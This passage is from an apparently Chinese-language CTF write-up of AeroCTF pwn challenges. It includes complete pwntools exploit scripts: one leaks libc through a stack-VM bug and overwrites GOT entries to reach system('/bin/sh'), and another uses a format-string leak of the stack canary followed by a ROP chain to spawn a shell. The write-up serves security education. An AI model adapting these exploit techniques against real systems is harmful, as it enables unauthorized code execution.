        case 'd':
          --stack_ptr;
          break;
        case 'g':
          *stack_ptr = getchar();
          break;
        case 'p':
          putchar((char)*stack_ptr);
          break;
        case 's':
          --*stack_ptr;
          break;
        case 'u':
          ++stack_ptr;
          break;
        default:
          exit(0xFFFFFAC7);
          return;
      }
    }
套路还是和上题一样
  * leak 出got表函数的地址，计算libc.address（没给libc要查找一下）
  * 修改exit[@got](https://github.com/got "@got")为main，获得再次输入的机会
  * 修改auth=0，strcmp=system[@libc](https://github.com/libc "@libc")，再次进入main
  * 输入/bin/sh，用strcmp触发system函数
解题脚本
    #!/usr/bin/env python2
    # -*- coding:utf8 -*-    
    import struct
    from pwn import *
    from pwnlib.util.proc import wait_for_debugger
    local = len(sys.argv) == 2
    elf = ELF(sys.argv[1])
    if local:
        io = process(sys.argv[1])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6") #32bit
    NAME = "admin"
    PASS = "password"
    io.sendlineafter("Login: ",NAME) 
    io.sendlineafter("Password: ",PASS) 
    #stack             = 0x804C0A0
    #putchar@got     = 0x804C03C
    #exit@got        = 0x804C028
    code = 'd'*(0xa0-0x3f)
    code += 'p'
    code += 'p' #print putchar@got
    code += 'd'
    code += 'p' #print putchar@got
    code += 'd'
    code += 'p' #print putchar@got
    code += 'd'
    code += 'p' #print putchar@got 0x3c
    code += 'd'*(0x3c - 0x2b)
    # code += 'g' 
    code += 'd'
    code += 'g' #莫名其妙多了个n，多输入一次
    code += 'g' #write exit@got -> main
    code += 'd'
    code += 'g' #write exit@got -> main
    code += 'd'
    code += 'g' #write exit@got -> main
    code += 'x' #trigger exit()
    io.sendafter("Input your code here: ",code)
    print hex(libc.symbols["putchar"])
    #第一次调用putchar，让putchar@got=putchar@libc
    io.recv(1)
    c = ''
    c += io.recv(1)
    c += io.recv(1)
    c += io.recv(1)
    c += io.recv(1)
    putchar_addr = u32(c[::-1])
    success("putchar_addr : %x"%putchar_addr)
    libc.address = putchar_addr - libc.symbols["putchar"]
    success("libc.address : %x"%libc.address)
    #exit未触发，最高位是08不用修改
    time.sleep(1)
    main_addr = 0x8049222
    io.send('x04')
    io.send('x92')
    io.send('x22')
    #stack             = 0x804C0A0
    #auth             = 0x804C064 
    #strcmp@got     = 0x804C00C
    code = 'd'*(0xa0-0x64)
    code += 'g' #write auth = 0
    code += 'd'*(0x64 - 0x0f)
    code += 'g' #write strcmp@got -> system
    code += 'd'
    code += 'g' #write strcmp@got -> system
    code += 'd'
    code += 'g' #write strcmp@got -> system
    code += 'd'
    code += 'g' #write strcmp@got -> system
    code += 'x' #trigger exit() back to main
    io.sendafter("Input your code here: ",code)
    time.sleep(1)
    io.send('x00') #reset auth
    system_addr = p32(libc.symbols["system"])
    success("system@libc :%x"%libc.symbols["system"])
    for i in range(4):
        io.send(system_addr[4-1-i]) #reset auth
    io.sendlineafter("Login: ","/bin/sh") 
    io.sendlineafter("Password: ","aaa") 
    io.interactive()
###  remote storage
stripped，没给符号，但是发现是static linked，说明system和/bin/sh都在elf中
    anic@ubuntu:~/ctfsample/aeroctf/pwn3$ file storage
    storage: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=601158bdf08a8379f6b7cbe803dd1bf99bfa7e35, stripped
    anic@ubuntu:~/ctfsample/aeroctf/pwn3$ checksec storage
    [*] '/mnt/hgfs/ctfsample/aeroctf/pwn3/storage'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
虽然checksec说没有canary，但是实际运行发现是有canary的
没有符号，重命名函数的过程比较痛苦，主要考猜，如fread啊、fopen、printf和puts之类。期待大佬们有更好的方法，请告知。
在signfile函数，有一个格式化字符串漏洞，一开始以为是签名后的内容，后面发现是filehash和signer的异或结果，可以控制输出cannary
     printf("%02x", (unsigned __int8)v11[j]);
        v7 = strlen(v10);
        for ( k = 0; k  0 )
        {
          v12[v7] = 0;
          fputs(v12, fd);
        }
        fclose(fd);
      }
结合上面获得的canary和静态编译到elf的system、binsh，来一波rop进行getshell
    #!/usr/bin/env python2
    # -*- coding:utf8 -*-    
    import struct
    from pwn import *
    from pwnlib.util.proc import wait_for_debugger
    local = len(sys.argv) == 2
    elf = ELF(sys.argv[1])
    if local:
        io = process(sys.argv[1])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6") #32bit
    def uploadfile(name,content):
        io.sendlineafter("> ","2")
        io.sendlineafter("filename: ",name)
        io.sendlineafter("file data: ",content)
    def addfileInfo(filename,name,date,name2):
        io.sendlineafter("> ","5")
        io.sendlineafter("filename: ",filename)
        io.sendafter("owner name: ",name)
        io.sendafter("create date: ",date)
        io.sendafter("owner name: ",name2)
    def viewfileInfo(filename):
        io.sendlineafter("> ","6")
        io.sendlineafter("filename: ",filename)
    def signfile(filename,signer):
        io.sendlineafter("> ","4")
        io.sendlineafter("filename: ",filename)
        io.sendlineafter("signer name: ",signer)
    def get_signer(hash,target):
        result = ""
        for i in range(len(target)):
            t = ord(target[i]) ^ ord(hash[i])
            result += chr(t)
        return result
    NAME = "admin"
    PASS = "admin"
    io.sendlineafter("Login: ",NAME) 
    io.sendlineafter("Password: ",PASS) 
    uploadfile("aaa","bbb")
    filehash = 'b8694d827c0f13f22ed3bc610c19ec15'.decode("hex")
    targethash = '.zz%195$p..x00'
    signer = get_signer(filehash,targethash)
    success("signer : %s"%signer)
    signfile("aaa",signer.ljust(16,'a'))
    #get cannary
    io.recvuntil("zz")
    cannary = int(io.recvuntil("..",drop=True),16)
    success("cannary : %x"%cannary)
    #rop to system
    system_addr = 0x8052CF0
    bin_sh = 0x80C7B8C
    payload = "e"*(256) + p32(cannary) + p32(0xabcdef)*3 + p32(system_addr) + p32(0xfedcba) + p32(bin_sh)
    addfileInfo("aaa","ccc","ddd", payload)
    io.interactive()
## 小结
  * 逆向比较有特色，pwn的题目相对简单
  * qemu+IDA+Ghidra组合拳出乎意料的好用